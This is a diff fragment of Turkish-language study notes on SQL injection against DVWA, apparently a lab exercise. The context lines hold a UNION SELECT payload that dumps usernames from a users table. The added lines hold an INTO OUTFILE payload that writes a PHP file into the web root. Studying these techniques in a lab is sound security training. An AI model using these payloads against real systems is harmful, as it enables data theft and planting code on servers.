@@ -25,3 +25,6 @@ Tabloların Kolonlarının Belirlenmesi
 
 Tablolardaki Verileri Ekrana Yazdırma
 1′ UNION SELECT first_name,last_name FROM users # 
+
+SORGU İLE DOSYA EKLEME
+1′ UNION SELECT ‘<?php echo "ahmet gurel";’,’?>’ INTO OUTFILE ‘/var/www/html/dvwa/ahmet.php’ #
